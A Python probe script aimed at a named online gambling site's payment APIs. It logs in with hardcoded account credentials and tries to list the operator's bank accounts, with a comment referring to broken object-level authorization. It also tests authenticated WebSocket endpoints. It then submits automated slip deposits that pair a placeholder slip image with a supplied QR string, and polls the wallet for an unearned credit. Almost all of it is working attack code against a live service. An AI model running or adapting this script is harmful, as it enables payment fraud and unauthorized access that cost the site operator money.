#!/usr/bin/env python3
"""probe_we88c_monitor.py — Monitor we88c deposit + WSS for live QR deposit.

   User will provide real qr_string for 100.00 THB deposit.
   Monitors: wallet, deposit status, WebSocket events.
"""
import json, requests, time, sys, asyncio
import websockets

TID = "54ef7626cb381f4bab8be91f0cdbce47"
PBAPI = f"https://{TID}pbapi.asdgapicenterssdo.com"
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
BGAPI = f"https://{TID}bgapi.asdgapicenterssdo.com"
DOMAIN = "m.we88c.com"

PHONE = "0972571110"
PASS = "Pwned2026!"

# Auth
print("=== Authenticating to we88c ===")
r = requests.post(f"{PBAPI}/pb/authentication",
    headers={"Content-Type": "application/json"},
    json={"strategy": "local", "username": PHONE, "password": PASS},
    timeout=15)
if r.status_code not in (200, 201):
    print(f"Auth failed: {r.status_code}: {r.text[:100]}")
    sys.exit(1)

auth_data = r.json()
JWT = auth_data["accessToken"]
PLAYER_ID = auth_data.get("id", "?")
print(f"  JWT OK | Player ID: {PLAYER_ID[:12]}...")

HDR = {"Authorization": f"Bearer {JWT}", "template": "vn", "Content-Type": "application/json"}

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    if r.ok:
        data = r.json().get("data", [{}])
        return data[0].get("balance", "?") if isinstance(data, list) else "?"
    return f"ERR:{r.status_code}"

print(f"\n=== Initial wallet: {wallet()} THB ===")

# Get bank accounts
print("\n=== Available bank accounts ===")
r = requests.get(f"{BGAPI}/bo/info/payment-bank-account",
    headers={"Authorization": f"Bearer {JWT}", "template": "vn"},
    params={"domain": DOMAIN}, timeout=15)
bank_ids = []
if r.ok:
    items = r.json() if isinstance(r.json(), list) else r.json().get("data", [])
    for item in items:
        if item.get("is_active"):
            bid = item.get("id", "?")
            btype = item.get("payment_type_code", "?")
            bno = item.get("bank_no", "?")
            bname = item.get("payment_name", "?")
            bank_ids.append(bid)
            print(f"  {bid[:8]} | {btype:15} | {bno}")
else:
    print(f"  BOLA blocked: {r.status_code}")

# Check for mgapi bank endpoint
print("\n=== mgapi payment-bank-information ===")
r = requests.get(f"{MGAPI}/mb/payment-bank-information", headers=HDR, timeout=10)
print(f"  HTTP {r.status_code}")
if r.ok:
    print(f"  {r.text[:300]}")

# WebSocket endpoints to try
print("\n=== WebSocket endpoints ===")
ws_urls = [
    f"wss://{TID}pbapi.asdgapicenterssdo.com/socket.io/?transport=websocket",
    f"wss://{TID}mgapi.asdgapicenterssdo.com/socket.io/?transport=websocket",
    f"wss://pbapi.asdgapicenterssdo.com/socket.io/?transport=websocket",
    f"wss://mgapi.asdgapicenterssdo.com/socket.io/?transport=websocket",
]

async def test_ws(url):
    try:
        async with websockets.connect(url,
            extra_headers={"Authorization": f"Bearer {JWT}"},
            close_timeout=3) as ws:
            print(f"  [CONNECTED] {url[:50]}")
            # Try to send auth
            await ws.send(json.dumps({"type": "auth", "token": JWT}))
            msg = await asyncio.wait_for(ws.recv(), timeout=3)
            print(f"    Recv: {msg[:100]}")
            return True
    except Exception as e:
        print(f"  [FAIL] {url[:50]}: {str(e)[:50]}")
        return False

print("\nTesting WebSocket connections...")
# Run async tests
loop = asyncio.new_event_loop()
for url in ws_urls:
    loop.run_until_complete(test_ws(url))

# Now wait for user's QR string input
print("\n" + "="*60)
print("READY FOR LIVE DEPOSIT TEST")
print("="*60)
print(f"\nPlayer ID: {PLAYER_ID}")
print(f"Wallet: {wallet()} THB")
print(f"\nAvailable bank IDs: {len(bank_ids)}")

if len(sys.argv) > 1:
    qr_string = sys.argv[1]
    bank_id = sys.argv[2] if len(sys.argv) > 2 else (bank_ids[0] if bank_ids else "")

    print(f"\n=== Submitting deposit with provided QR ===")
    print(f"  QR: {qr_string[:50]}...")
    print(f"  Bank ID: {bank_id[:12] if bank_id else 'NONE'}")

    payload = {
        "payment_bank_information_id": bank_id,
        "deposit_amount": 100,
        "note": "$",
        "slip_image_url": f"slip_live.jpg",
        "qr_string": qr_string,
    }

    r = requests.post(f"{MGAPI}/mb/auto-slip-deposit", headers=HDR,
                      json=payload, timeout=15)
    print(f"\n  POST auto-slip-deposit: {r.status_code}")
    print(f"  Response: {r.text[:500]}")

    # Monitor wallet
    print("\n=== Monitoring wallet ===")
    for i in range(10):
        w = wallet()
        print(f"  [{i+1}/10] Wallet: {w} THB")
        if float(str(w).replace("ERR:", "0")) > 1:
            print(f"  [!!!] WALLET CREDITED!")
            break
        time.sleep(2)
else:
    print("\nUsage: python probe_we88c_monitor.py '<qr_string>' [bank_id]")
    print("\nWaiting for input... Press Ctrl+C to exit")
    print("\nOr paste QR string below:")

    try:
        while True:
            qr = input("\nQR String: ").strip()
            if qr:
                print(f"\nReceived QR: {qr[:50]}...")
                # Use first active bank
                bank_id = bank_ids[0] if bank_ids else ""

                payload = {
                    "payment_bank_information_id": bank_id,
                    "deposit_amount": 100,
                    "note": "$",
                    "slip_image_url": "slip_live.jpg",
                    "qr_string": qr,
                }

                r = requests.post(f"{MGAPI}/mb/auto-slip-deposit", headers=HDR,
                                  json=payload, timeout=15)
                print(f"  POST: {r.status_code}")
                print(f"  Response: {r.text[:300]}")

                # Monitor
                for i in range(5):
                    time.sleep(2)
                    w = wallet()
                    print(f"  Wallet: {w}")
    except KeyboardInterrupt:
        print("\nExiting...")
